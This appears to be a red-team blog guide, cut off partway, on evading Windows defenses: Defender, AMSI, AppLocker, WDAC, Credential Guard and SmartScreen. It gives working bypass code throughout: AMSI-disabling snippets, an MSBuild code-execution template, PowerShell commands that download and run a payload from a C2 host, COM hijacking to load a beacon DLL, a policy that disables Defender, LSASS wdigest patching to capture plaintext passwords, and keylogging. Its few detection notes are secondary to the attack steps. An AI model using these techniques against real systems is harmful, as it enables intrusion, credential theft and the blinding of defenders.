> *Hi I'm DebuggerMan, a Red Teamer.*
> You got initial access. Your beacon is live. But now the real game begins  **staying undetected**. Every modern enterprise stacks security controls in layers: AV, EDR, AppLocker, WDAC, Credential Guard, SmartScreen, ASR, Sysmon, PPL. Each one is a wall. This is the definitive guide to understanding every control and the tradecraft to get through it. 10 phases. Every technique mapped to MITRE ATT&CK TA0005. Full OPSEC tradecraft. No fluff.

![Security Stack](/assets/img/sec-controls/security-stack.png)
_The full Windows security control stack  each layer must be addressed independently_

## Why Security Controls Matter

You bypassed the email gateway. You popped the phishing page. Your payload executed. Then nothing  your beacon never calls back. Or it does, but one hour later you're burned and IR is on site.

**Understanding security controls is the difference between a one-shot payload and a repeatable, scalable operation.**

Every modern enterprise deploys layered defenses. The MITRE ATT&CK framework maps evasion to **TA0005 – Defense Evasion**, with 40+ techniques covering everything from disabling security tools to manipulating the kernel itself.

A mature evasion strategy has three properties:

- **Layered**  Bypass multiple controls independently. If your AV bypass fails, your WDAC bypass still holds.
- **Adaptive**  Understand *why* each control fires, not just *how* to bypass it. Controls evolve; tradecraft must too.
- **Minimal Footprint**  The best evasion leaves no artifacts. Native APIs, LOLBins, and in-memory execution win over dropped binaries.

## Phase 1: Windows Defender  Static & Dynamic Detection

![Defender Bypass Pipeline](/assets/img/sec-controls/defender-pipeline.png)
_The complete static bypass build pipeline: OLLVM → Encrypted PE Loader → VMProtect_

### What It Is

Windows Defender (Microsoft Defender Antivirus, MDAV) is the built-in AV solution in Windows 10/11 and Windows Server. It operates at multiple layers:

- **MsMpEng.exe**  The main antivirus service (user mode)
- **WdFilter.sys**  Kernel-mode minifilter driver; intercepts file I/O at the filesystem level
- **AMSI (Antimalware Scan Interface)**  Hooks into script engines (.NET, PowerShell, VBScript, JScript, Office macros)
- **MpCmdRun.exe**  Command-line interface for Defender operations

```

        ▼

```

### Static Detection  How It Works

Static detection happens **before execution**:
1. **Signature matching**  MD5/SHA1 hashes and byte patterns from the signature database
2. **Heuristic analysis**  Pattern recognition for suspicious code constructs (PE imports, shellcode patterns, encoded strings)
3. **ML classifier**  File is classified by a trained model based on PE features

**Detection trigger examples:**
- Known shellcode byte sequences (`\xfc\x48\x83\xe4\xf0`  classic Meterpreter stub)
- Suspicious PE imports (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` in sequence)
- YARA-like string patterns (`cmd.exe /c`, base64 encoded PowerShell blocks)

### Static Bypass  T1027 Obfuscate/Encode

The goal is to **change the byte pattern** without changing functionality:

```powershell
# Check if a file triggers Defender (without executing it)
& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -Scan -ScanType 3 -File .\payload.exe
```

**Technique 1: Payload encryption**
Wrap shellcode in an encrypted stub. The stub decrypts at runtime  only the decryption stub hits disk, which has no malicious signatures.

```c
// XOR encrypt payload before embedding
void encrypt(unsigned char *buf, int len, char key) {
    for (int i = 0; i < len; i++) buf[i] ^= key;
}
// Stub decrypts at runtime  static scan sees only random bytes
```

**Technique 2: Custom PE compilation**
Rebuild the implant from source with changed strings, imports, and metadata. Every compiled Cobalt Strike artifact has unique signatures; the Artifact Kit lets you change the shellcode stub.

```bash
# Cobalt Strike Artifact Kit rebuild
./build.sh mailslot HeapAlloc 344564 0 true false none /mnt/c/Tools/cobaltstrike/artifacts
```

**Technique 3: UDRL (User-Defined Reflective Loader)**
Replace CS's default reflective loader with a custom one. The loader is what Defender most commonly detects  a custom loader changes the entire signature profile.

**Technique 4: Sleep obfuscation**
When beacon sleeps, encrypt itself in memory. Defenders scanning memory will see random bytes instead of shellcode. Notable implementations include **Ekko** (ROP-based timer queue encryption), **Foliage** (APC-based), and **Cronos** (direct NtContinue-based). Each encrypts the beacon's memory region during sleep and decrypts it upon wake using timer callbacks, making memory scanners see only ciphertext during the sleep window.

**Technique 5: OLLVM Obfuscation (Obfuscator-LLVM)**
OLLVM is a compiler-level obfuscation framework that transforms code during compilation, making static signature matching nearly impossible. Unlike runtime obfuscation, OLLVM operates at the LLVM intermediate representation level, producing binaries with fundamentally different instruction sequences.

The key obfuscation passes are:
- **Substitution (`-sub`)**  Replaces standard operations with equivalent but more complex sequences. For example, `a + b` becomes `a - (-b)` or uses boolean algebra transformations
- **Control Flow Flattening (`-fla`)**  Destroys the original control flow graph by replacing structured code with a switch-based dispatch loop. Every basic block becomes a case in a state machine, making reverse engineering and pattern matching extremely difficult
- **Bogus Control Flow (`-bcf`)**  Inserts fake conditional branches with opaque predicates (conditions that always evaluate the same way but appear complex). This inflates the binary with dead code paths that confuse analysis
- **Basic Block Splitting (`-split`)**  Breaks basic blocks into smaller fragments, further disrupting signature-based detection

```
┌─────────────────────────────────────────────────────────┐
│              OLLVM OBFUSCATION PIPELINE                   │
└─────────────────────────────────────────────────────────┘

  Source Code (.c)
       │
       ▼
  Clang Frontend → LLVM IR
       │
       ├─► Substitution Pass     → replaces arithmetic ops
       ├─► Control Flow Flatten  → state machine dispatch
       ├─► Bogus Control Flow    → opaque predicates + dead code
       └─► Block Splitting       → fragment basic blocks
       │
       ▼
  OLLVM Binary (.exe)
  → Completely different instruction sequences
  → No matching signatures
  → Same functionality
```

**Setup:** Install pre-compiled OLLVM binaries (e.g., `ollvm-13.0.1`) into Visual Studio's LLVM toolchain path (`C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\Llvm\x64\bin`). Set project Platform Toolset to **LLVM (clang-cl)** and add obfuscation flags:

```bash
# Light obfuscation  fast compilation, good signature evasion
-Xclang -flegacy-pass-manager -mllvm -sub -mllvm -split -mllvm -fla -mllvm -bcf

# Heavy obfuscation  slower compilation, maximum evasion
-Xclang -flegacy-pass-manager -mllvm -sub -mllvm -sub_loop=3 -mllvm -split \
  -mllvm -fla -mllvm -bcf -mllvm -bcf_prob=100 -mllvm -bcf_loop=3 -mllvm -split_num=3
```

> **Why it works:** Defender's static signatures rely on specific byte patterns and instruction sequences. OLLVM fundamentally changes the assembly output  the same C code compiled with MSVC and OLLVM produces entirely different binaries. YARA rules and signature hashes cannot match obfuscated variants.

**Technique 6: Encrypted PE Loading (Native PE Loader)**
Instead of dropping a malicious PE to disk, encrypt the entire PE file and build a custom loader that decrypts and maps it into memory at runtime. This defeats both on-disk signatures and on-write scanning by WdFilter.sys:

```
┌─────────────────────────────────────────────────────────┐
│              ENCRYPTED PE LOADING PIPELINE                │
└─────────────────────────────────────────────────────────┘

  1. ENCRYPT ─── AES-256 encrypt the malicious PE
     │           CryptAcquireContext() → CryptCreateHash()
     │           → CryptDeriveKey() → CryptEncrypt()
     │
  2. EMBED  ─── Store encrypted blob in loader's .data section
     │           Only random bytes on disk  no signatures
     │
  3. DECRYPT ── At runtime, derive key and decrypt PE in memory
     │           CryptDecrypt() → validate PE headers (MZ, PE\0\0)
     │
  4. MAP ────── Allocate memory and map PE sections
     │           VirtualAlloc() per section with correct protections
     │           Apply base relocations (delta fixup)
     │
  5. RESOLVE ── Walk Import Directory, resolve IAT
     │           LoadLibraryA() for each DLL
     │           GetProcAddress() for each function
     │           Patch IMAGE_THUNK_DATA entries
     │
  6. EXECUTE ── Set entry point and transfer control
               GetThreadContext() → SetThreadContext()
               Or call AddressOfEntryPoint directly
```

The loader itself is clean  it contains no malicious signatures. The encrypted payload is just random bytes to the static engine. Only at runtime does the actual PE materialize in memory.

**Technique 7: .NET Assembly CLR Loading with AMSI/ETW Bypass**
For .NET payloads (Seatbelt, Rubeus, SharpHound), the approach combines encrypted delivery with runtime security patching:

```
┌─────────────────────────────────────────────────────────┐
│            .NET CLR LOADING PIPELINE                      │
└─────────────────────────────────────────────────────────┘

  1. FETCH ──── Download encrypted .NET PE via raw TCP socket
     │          WSAStartup() → socket() → connect() → recv()
     │
  2. DECRYPT ── RC4 decrypt using SystemFunction032 (advapi32.dll)
     │          No custom crypto  uses native Windows API
     │
  3. PATCH ──── Bypass AMSI via hardware breakpoint on AmsiScanBuffer
     │          Set DR0 = AmsiScanBuffer address
     │          VEH handler intercepts, forces clean return
     │          (No memory patches  undetectable by integrity checks)
     │
  4. PATCH ──── Blind ETW by patching EtwEventWrite
     │          Prevents .NET runtime telemetry
     │
  5. HOST ───── Initialize CLR and load assembly in-memory
     │          CLRCreateInstance() → GetRuntime() → GetInterface()
     │          ICorRuntimeHost::Start()
     │
  6. EXECUTE ── Load and invoke the .NET assembly
               AppDomain::Load_3() → assembly from byte array
               MethodInfo::Invoke_3() → call Main()
```

The hardware breakpoint technique for AMSI is particularly effective because unlike memory patching (which writes to the `.text` section of `amsi.dll`), hardware breakpoints use CPU debug registers (DR0-DR3) and leave no memory modifications. A Vectored Exception Handler (VEH) catches the breakpoint exception and manipulates the return value to report the scan as clean.

**Technique 8: VMProtect Code Virtualization**
VMProtect transforms native code into bytecode for a custom virtual machine embedded in the binary. The VM architecture is unique per build  there's no universal disassembler for VMProtect'd code:

- Code sections are converted to custom opcodes executed by an embedded VM interpreter
- Each protected build generates a different VM architecture
- The virtualized code cannot be pattern-matched by signature scanners
- Reverse engineering requires understanding the custom VM instruction set per sample

VMProtect is used as a final hardening step in the build pipeline after compilation and before deployment.

> **OPSEC Tip:** Test against Defender in isolation before testing against full EDR. Use a test VM with only Defender enabled. `Set-MpPreference -DisableRealtimeMonitoring $false` to ensure it's active.

> **Build Pipeline:** The recommended order is: **Source Code → OLLVM compile → Encrypted PE Loader wrapping → VMProtect hardening**. Each layer independently defeats different detection mechanisms  OLLVM defeats static signatures, the PE loader defeats on-disk scanning, and VMProtect defeats reverse engineering.

### AMSI  How It Works

AMSI (Antimalware Scan Interface) is Microsoft's mechanism for scanning **content at runtime**, before script engines execute it. It's loaded as a DLL (`amsi.dll`) into every scriptable host:

- PowerShell (all versions 5.0+)
- .NET (via CLR)
- VBScript / JScript (via wscript/cscript)
- Office VBA macros
- COM/ActiveX

```
PowerShell Script →  AmsiScanBuffer() in amsi.dll → MsMpEng
                                   ↑
                          (every script block is scanned here)
```

The critical function is `AmsiScanBuffer()` in `amsi.dll`. It takes a buffer and passes it to the registered antimalware provider.

### AMSI Bypass  T1562.001

**Method 1: Patch AmsiScanBuffer in memory**

The most reliable in-memory patch sets the return value of `AmsiScanBuffer` to `AMSI_RESULT_CLEAN` (0x80070057  an error code that causes it to return clean):

```powershell
# Classic AMSI patch (obfuscated to bypass string detection)
$a = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
$b = $a.GetField('amsi' + 'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

**Method 2: Force AmsiInitFailed**
Setting the private field `amsiInitFailed` to `$true` causes PowerShell to skip AMSI scanning for the session:

```csharp
// In .NET: reflection-based patch
var amsiUtils = typeof(System.Management.Automation.PSObject)
    .Assembly
    .GetType("System.Management.Automation.AmsiUtils");
var field = amsiUtils.GetField("amsiInitFailed",
    BindingFlags.NonPublic | BindingFlags.Static);
field.SetValue(null, true);
```

**Method 3: Hardware breakpoint on AmsiScanBuffer**
This is the most evasion-resistant AMSI bypass because it makes **zero memory modifications** to `amsi.dll`. Instead, it uses the CPU's debug registers (DR0-DR3) to set a hardware breakpoint on the `AmsiScanBuffer` function:

```
┌─────────────────────────────────────────────────────────┐
│         HARDWARE BREAKPOINT AMSI BYPASS FLOW             │
└─────────────────────────────────────────────────────────┘

  1. Register a Vectored Exception Handler (VEH)
     AddVectoredExceptionHandler(1, handler)

  2. Set hardware breakpoint on AmsiScanBuffer
     GetThreadContext() → set DR0 = AmsiScanBuffer address
     DR7 = enable DR0 breakpoint (local, execute)
     SetThreadContext()

  3. When AMSI calls AmsiScanBuffer → CPU raises #DB exception
     └─ VEH handler fires:
        ├── Check: is RIP == AmsiScanBuffer?
        ├── Set RAX = AMSI_RESULT_CLEAN (0x80070057)
        ├── Set RIP = return address (skip function)
        └── Return EXCEPTION_CONTINUE_EXECUTION

  Result: AmsiScanBuffer never executes, always returns clean
  Detection: No memory patches → integrity checks pass
```

Unlike memory patching, this bypass is invisible to ETW-TI memory scanning and `amsi.dll` integrity verification. The debug registers are per-thread and only visible via `GetThreadContext()`.

**Method 4: COM-based AMSI bypass**
Load a COM object that hosts a script engine without AMSI registration. Older VBScript COM hosts may not have AMSI.

**Method 5: AmsiOpenSession manipulation**
Instead of patching `AmsiScanBuffer`, target `AmsiOpenSession` which is called first. Forcing it to return an error causes the entire AMSI scan chain to be skipped for that session.

> **Detection:** Defenders look for patches to `amsi.dll` exports in memory (ETW-TI `AmsiScanBuffer` return hooking), PowerShell script block logging for known bypass strings, CLR profiler API usage, and hardware breakpoint detection via `GetThreadContext()` on suspicious processes. The hardware breakpoint method is the hardest to detect but can be caught by monitoring debug register state.

### Behavioral Detection  T1055 Detection

The behavioral engine monitors:
- **Memory operations**  `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` sequences
- **Network calls**  DNS queries to DGA domains, C2 beaconing patterns
- **Process ancestry**  `winword.exe` spawning `cmd.exe` spawning `powershell.exe`
- **API call sequences**  Known injection patterns across process boundaries

**Bypass:** Sleep-based sandbox evasion (check uptime, screen resolution, username), environment keying (only execute if specific hostname/domain detected), and process ancestry spoofing (use `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to reparent processes).

---

## Phase 2: AppLocker  Application Whitelisting (User Mode)

### What It Is

AppLocker is Windows' application whitelisting solution, implemented via the **AppIDSvc** user-mode service. It evaluates policy rules before allowing executables, scripts, DLLs, and installers to run.

**Key architecture point:** AppLocker runs in **user mode**. The `AppIDSvc` service enforces policy by intercepting process creation at the Windows API level  not at the kernel level. This makes it fundamentally weaker than WDAC.

```
Process wants to execute
        │
        ▼
AppIDSvc (User Mode Service)
  → Checks policy rules (Registry: HKLM\Software\Policies\Microsoft\Windows\SrpV2)
        │
  ┌─────▼─────────────────────────────┐
  │ Rule Types                        │
  │  1. Publisher (code signing cert) │
  │  2. Path (file/folder path)       │
  │  3. File Hash (SHA256)            │
  └───────────────────────────────────┘
        │
   Allow or Block
```

### Default Rules

The default AppLocker policy (recommended by Microsoft) includes these allow rules:

**Executable Rules:**
```
Allow | Everyone   | Path | %PROGRAMFILES%\*
Allow | Everyone   | Path | %WINDIR%\*
Allow | Admins     | Path | *
```

**Script Rules:**
```
Allow | Everyone   | Path | %PROGRAMFILES%\*
Allow | Everyone   | Path | %WINDIR%\*
Allow | Admins     | Path | *
```

**Windows Installer Rules:**
```
Allow | Everyone   | Publisher | * (any signed installer)
Allow | Admins     | Path      | *.*
```

### Enumeration

```powershell
# Method 1: Registry
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'

# Method 2: Native cmdlet (human-readable)
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Method 3: GPO via SYSVOL
# 1. Find GPO with AppLocker
ldapsearch "(objectClass=groupPolicyContainer)" --attributes displayName,gPCFileSysPath
# 2. Enumerate
ls \\contoso.com\SysVol\contoso.com\Policies\{GPO-ID}\Machine
# 3. Pull registry.pol
Parse-PolFile -Path .\Registry.pol
```

### Bypass 1: Writable Paths Within %WINDIR%

AppLocker allows `%WINDIR%\*` by default. Several subdirectories within `%WINDIR%` are **writable by standard users**:

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
```

**Find writable paths:**
```powershell
# Check write permissions on WINDIR subdirectories
Get-ChildItem C:\Windows -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
    $acl.Access | Where-Object {
        $_.IdentityReference -match "Everyone|Users|Authenticated" -and
        $_.FileSystemRights -match "Write|FullControl"
    } | ForEach-Object { $_.Path }
}

# Or use icacls
icacls C:\Windows\* /T 2>$null | findstr "BUILTIN\Users:(W"
```

Drop your payload into a writable path and execute:
```cmd
copy payload.exe C:\Windows\Tasks\svchost.exe
C:\Windows\Tasks\svchost.exe
```

### Bypass 2: LOLBAS (Living Off the Land Binaries)  T1218

Binaries already in `%WINDIR%` or `%PROGRAMFILES%` are allowed by default. Many can execute arbitrary code:

**MSBuild** (`C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe`):
```xml
<!-- exploit.csproj  executes arbitrary C# code via MSBuild task -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using Microsoft.Build.Utilities;
        public class MSBuild : Task {
            public override bool Execute() {
                // Execute shellcode here
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```powershell
msbuild.exe exploit.csproj
```

**Other LOLBAS for AppLocker bypass:**
- `regsvr32.exe`  COM scriptlet execution via scrobj.dll
- `mshta.exe`  HTA/JavaScript execution
- `wmic.exe`  XSL transform execution
- `rundll32.exe`  DLL execution (if DLL rules not enabled)
- `InstallUtil.exe`  .NET assembly execution

Reference: [lolbas-project.github.io](https://lolbas-project.github.io)

### Bypass 3: PowerShell Constrained Language Mode (CLM)

AppLocker downgrades PowerShell from **FullLanguage** to **ConstrainedLanguage** mode. CLM restricts:
- Direct .NET method calls
- Win32 API access via P/Invoke
- Add-Type with custom code
- COM object creation (partially)

**Check current language mode:**
```powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage  ← you're in CLM
```

**CLM Escape Method 1: COM objects** (still allowed in CLM):
```powershell
# WScript.Shell is allowed  execute arbitrary commands
$shell = New-Object -ComObject WScript.Shell
$shell.Run("powershell.exe -NonInteractive -W Hidden -C IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')")
```

**CLM Escape Method 2: Custom COM DLL registration**
Register a malicious DLL as a COM server in HKCU (no admin required):
```powershell
# Generate a new CLSID
[System.Guid]::NewGuid()

# Register malicious DLL as COM server (HKCU  no admin)
$clsid = '{2d434a57-2baf-4482-958a-c975ec7b6a27}'
New-Item -Path "HKCU:Software\Classes\CLSID\$clsid\InprocServer32" -Value 'C:\Windows\tracing\beacon_x64.dll'
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\$clsid\InprocServer32" -Name 'ThreadingModel' -Value 'Both'
New-Item -Path 'HKCU:Software\Classes' -Name 'MyApp.Bypass' -Value 'AppLocker Bypass'
New-Item -Path 'HKCU:Software\Classes\MyApp.Bypass\CLSID' -Value $clsid

# Load the DLL via COM
$obj = New-Object -ComObject MyApp.Bypass
```

**CLM Escape Method 3: PowerShell 2.0 downgrade**
PS 2.0 doesn't support AMSI or CLM:
```powershell
powershell -Version 2 -Command "IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')"
```
> **Note:** This requires PowerShell 2.0 to be installed and .NET 2.0 framework present. Microsoft is slowly removing PS 2.0 from modern builds.

### Bypass 4: DLL Rules Not Enforced

AppLocker's DLL rules are **disabled by default** due to performance impact. When DLL rules are absent:

```powershell
# Load a beacon DLL via rundll32
rundll32.exe C:\Windows\tracing\beacon_x64.dll,StartW
```

The Cobalt Strike Beacon DLL exports `StartW` specifically for this use case.

> **OPSEC Tip:** AppLocker enforcement requires the `AppIDSvc` service to be running. Check: `Get-Service AppIDSvc`. If it's stopped, AppLocker doesn't enforce. On some systems it's set to Manual and never started.

---

## Phase 3: WDAC  Windows Defender Application Control (Kernel Level)

### What It Is

WDAC (formerly Device Guard Code Integrity) is Microsoft's **kernel-level** application control solution. Unlike AppLocker (user mode), WDAC enforces policy directly in the Windows kernel via the Code Integrity (CI) component.

**Key difference from AppLocker:**

| Feature | AppLocker |
|---------|-----------|
| Enforcement Layer | User mode (AppIDSvc) |
| DLL Control | Optional |
| Script Control | Yes |
| Bypass difficulty | Low-Medium |
| Admin bypass | Possible |
| Policy format | Registry |

### Policy Architecture

WDAC policies are defined as XML files, compiled to Code Integrity Policy (`.cip`) binary files, and deployed to:
```
C:\Windows\System32\CodeIntegrity\CIPolicies\Active\
```

**View active policies:**
```powershell
# List deployed policies
CiTool --list-policies

# Decompile a policy (WDACTools)
Import-Module C:\Tools\WDACTools\WDACTools.psd1
ConvertTo-WDACCodeIntegrityPolicy `
    -BinaryFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.CIP' `
    -XmlFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.xml'
```

**Key policy structure:**
```xml
<PolicyID>{E01193E3-74CA-4F99-83D7-1A9522374B3F}</PolicyID>
<BasePolicyID>{E01193E3-74CA-4F99-83D7-1A9522374B3F}</BasePolicyID>
<!-- Rule options -->
<!-- Signers/Publishers -->
<!-- File rules (allow/deny) -->
```

### Rule Options That Matter

| Option | Impact |
|--------|--------|
| **Audit Mode** | Logs only, doesn't block |
| **UMCI** | Restricts user-mode + kernel |
| **Dynamic Code Security** | Restricts .NET JIT / dynamic assemblies |
| **Runtime FilePath Rule Protection** | Writability check on path rules |

**Check if a policy is in audit mode:**
```powershell
$xml = [xml](Get-Content policy.xml)
$xml.SiPolicy.Rules.Rule | Where-Object { $_.Option -eq 'Enabled:Audit Mode' }
```
If this rule exists, the policy is **only logging**  not blocking. Your payload runs freely.

### File Attribute Rules  Weak Rule Exploitation

File rules can match based on binary attributes (OriginalFilename, ProductName, Version) rather than hash or path. This is **weak** because anyone can compile a binary with matching attributes.

**Exploit:** Modify `resource.rc` in the Cobalt Strike Artifact Kit to match the whitelisted attributes, then rebuild:
```bash
# After modifying resource.rc to set matching OriginalFilename/Version
./build.sh mailslot HeapAlloc 344564 0 true false none /mnt/c/Tools/cobaltstrike/artifacts
```

Your beacon binary now has the trusted file attributes and will pass the WDAC file attribute rule.

### Path Wildcards  Runtime Writability Check

WDAC checks whether a path-whitelisted directory is writable by non-admin SIDs at runtime. Admin SIDs that bypass this check:
```
S-1-3-0   (Creator Owner)
S-1-5-18  (LocalSystem)
S-1-5-19  (LocalService)
S-1-5-20  (NetworkService)
S-1-5-32-544  (Administrators)
```
If **only** admin SIDs can write to a whitelisted path, the rule is safe. If standard users can write to it, drop your binary there.

### Bypass: Supplemental Policies (Admin Required)

With local admin access, you can deploy a supplemental policy to whitelist your tools:

```powershell
# Using App Control Wizard or ConfigCI module:
# 1. Create supplemental policy XML (allows your tools)
# 2. Compile to .CIP
$policy = New-CIPolicy -FilePath "supplement.xml" -Level Hash -Fallback None
# 3. Deploy
CiTool -up "{GUID}.cip"   # --update-policy
# 4. Remove when done
CiTool -rp "{GUID}.cip"   # --remove-policy
```

> **OPSEC Tip:** Be targeted  only whitelist the exact paths and hashes you need. Adding `C:\*` will trigger detection. Blue teams monitor new policy deployments via event ID 3099 in the Microsoft-Windows-CodeIntegrity/Operational log.

### Bypass: Deny-Only Base Policy to Kill Defender

With admin access, deploy a deny-only base policy to prevent Defender from running:

Start from `C:\Windows\schemas\CodeIntegrity\ExamplePolicies\AllowAll.xml` and add a deny rule:
```xml
<FileRules>
  <Deny ID="ID_DENY_MPENG" FilePath="C:\Program Files\Windows Defender\MsMpEng.exe"/>
</FileRules>
```

This denies `MsMpEng.exe` even though the base policy allows all Microsoft-signed binaries  **deny rules always take priority over allow rules**.

## Phase 4: Credential Guard  VBS & LSAIso

### What It Is

Credential Guard uses **Virtualization-Based Security (VBS)** to isolate credential secrets from the main Windows OS, including from SYSTEM-level processes and the kernel itself.

```
┌─────────────────────────────────────────────────────────┐
│                 VIRTUALIZATION LAYER                     │
│                  (Hyper-V Hypervisor)                    │
├──────────────────────────┬──────────────────────────────┤
│   Normal World (VTL 0)   │   Secure World (VTL 1)       │
│                          │                              │
│   Windows OS             │   LSAIso (Isolated LSA)      │
│   LSASS                  │   → Stores NTLM hashes       │
│   Drivers                │   → Stores Kerberos TGTs     │
│   EDR / AV               │   → Stores session keys      │
│                          │                              │
│   ← Cannot read VTL 1 → │   ← VBS Security Boundary →  │
└──────────────────────────┴──────────────────────────────┘
```

**LSAIso** (LSASS Isolated) runs in **VTL 1 (Secure World)**  protected by the hypervisor. Even SYSTEM-level code in VTL 0 cannot read memory in VTL 1. This means traditional `lsass.exe` memory dumps no longer yield NTLM hashes or TGT session keys.

### Check If Credential Guard Is Enabled

```powershell
# Method 1: WMI
Get-WmiObject -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -Property SecurityServicesRunning
# 1 = Credential Guard running

# Method 2: Registry
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\LSA' -Name LsaCfgFlags
# 1 = Credential Guard enabled with UEFI lock
# 2 = Credential Guard enabled without lock

# Method 3: Process check
Get-Process lsaiso -ErrorAction SilentlyContinue
# If lsaiso.exe exists, Credential Guard is running
```

### What It Protects (and Doesn't)

Credential Guard **protects:**
- NTLM password hashes
- Kerberos TGTs and their session keys
- DPAPI master keys

Credential Guard **does NOT protect:**
- Kerberos service tickets (ST)  once issued, they're in regular memory
- Credentials typed by the user (keylogger access)
- Local account credentials (SAM database)
- Domain cached credentials (DCC/MSCACHE)
- Credentials stored by 3rd-party apps
- Client authentication certificates (PKINIT)

### Alternate Tradecraft  Bypassing the Bypass

Since Credential Guard makes traditional NTLM hash extraction impossible, pivot to what's still accessible:

**1. Kerberos Service Tickets**
```powershell
# Kerberoasting  request service tickets for SPNs, crack offline
Invoke-Kerberoast -OutputFormat HashCat | Out-File kerberoast_hashes.txt
```

**2. Keylogging**  capture credentials as users type them:
```powershell
# PowerSploit Get-Keystrokes
Get-Keystrokes -LogPath C:\Windows\Temp\keys.log
```

**3. DPAPI Credential Theft**  Chrome saved passwords, credential manager:
```powershell
# Via SharpDPAPI
SharpDPAPI.exe credentials /password:UserPassword
```

**4. Domain Cached Credentials (DCC2/MSCACHE)**
```powershell
# Still accessible via registry (requires SYSTEM)
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL
```

**5. ADCS Certificate Theft  T1649**
Request a certificate from AD CS for a user  use it instead of their password:
```powershell
# Certify  find vulnerable cert templates
Certify.exe find /vulnerable
# Request a cert as another user (ESC1, ESC4, etc.)
Certify.exe request /ca:CA-Server\CA-Name /template:VulnTemplate /altname:admin
```

**6. CVE-2025-21299 / CVE-2025-29809  Recent Bypass**
Two patched vulnerabilities allowed TGT extraction from LSAIso. Expect similar research  but patched vulns will be fixed quickly. Don't rely on unpatched CVEs in mature environments.

### Credential Guard Patching  wdigest.dll Variable Manipulation

Even with Credential Guard enabled, there's a technique that can force WDigest to cache plaintext credentials again. This works by patching specific global variables inside `wdigest.dll` loaded within `lsass.exe`:

```
┌─────────────────────────────────────────────────────────┐
│           CREDENTIAL GUARD PATCHING FLOW                  │
└─────────────────────────────────────────────────────────┘

  wdigest.dll's SpAcceptCredentials() contains a decision:

     if (g_IsCredGuardEnabled == 0  AND  g_fParameter_UseLogonCredential == 1)
         → Cache plaintext credentials in memory     ← v11=0 path
     else
         → Skip caching (protected by CredGuard)     ← v11=1 path

  Attack:
  1. OpenProcess(lsass.exe, PROCESS_ALL_ACCESS)
  2. Enumerate modules → find wdigest.dll base address
  3. Download PDB symbols → resolve variable offsets
  4. ReadProcessMemory  → read current values
  5. WriteProcessMemory → set g_fParameter_UseLogonCredential = 1
  6. WriteProcessMemory → set g_IsCredGuardEnabled = 0
  7. Wait for next user logon → plaintext credentials cached
  8. Dump LSASS → extract plaintext passwords
```

**Key variables in wdigest.dll:**
- `g_fParameter_UseLogonCredential`  Controls whether WDigest caches credentials. Set to **1** to enable caching
- `g_IsCredGuardEnabled`  WDigest's internal flag for Credential Guard status. Set to **0** to make WDigest believe Credential Guard is disabled

**Requirements:** Requires SYSTEM privileges (or PPL bypass if LSASS is protected) and the ability to write to LSASS memory. After patching, a new user logon is needed for credentials to be cached  the patch only affects future logons, not already-cached sessions.

> **Detection:** Monitor `lsass.exe` for `WriteProcessMemory` calls targeting `wdigest.dll` address ranges. Sysmon Event 10 (process accessed) with write access to LSASS is a high-fidelity detection. Additionally, monitor the registry key `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`  setting it to `1` is the non-patching equivalent.

> **Tradecraft Reality:** VBS is a real security boundary. The wdigest patching technique works even with Credential Guard enabled because it changes how `wdigest.dll` *behaves* rather than bypassing the VBS isolation itself. For environments where this is patched, pivot to Kerberoasting, ADCS abuse, or DCC extraction.

## Phase 5: SmartScreen  Reputation & Mark of the Web

### What It Is

Windows SmartScreen is a reputation-based filter that runs **before** a file is executed. It checks:
1. **Application reputation**  Is this file known and trusted by Microsoft?
2. **Mark of the Web (MOTW)**  Does this file come from the internet?
3. **Publisher reputation**  Is the signing certificate trusted and reputable?

```
User downloads file → Zone.Identifier ADS written by browser
        │
        ▼
User double-clicks file → SmartScreen checks
        │
  ┌─────▼────────────────────────────────┐
  │  1. Check Zone.Identifier ADS        │
  │     ZoneId=3 → "from internet"       │
  │                                       │
  │  2. Hash lookup against Microsoft ISG │
  │     (Intelligent Security Graph)     │
  │                                       │
  │  3. Code signing verification         │
  └───────────────────────────────────────┘
        │
   Known Good → Run silently
   Unknown    → "Windows protected your PC" dialog
   Known Bad  → Block
```

### Mark of the Web (MOTW)

When a browser downloads a file, Windows attaches an **Alternate Data Stream (ADS)** called `Zone.Identifier`:

```powershell
# See Zone.Identifier on a downloaded file
Get-Item -Path .\payload.exe -Stream Zone.Identifier
Get-Content -Path .\payload.exe -Stream Zone.Identifier
# ZoneId=3  ← Internet zone  SmartScreen will check this
```

Zone IDs:
```
0 = Local Machine
1 = Local Intranet
2 = Trusted Sites
3 = Internet (SmartScreen activates)
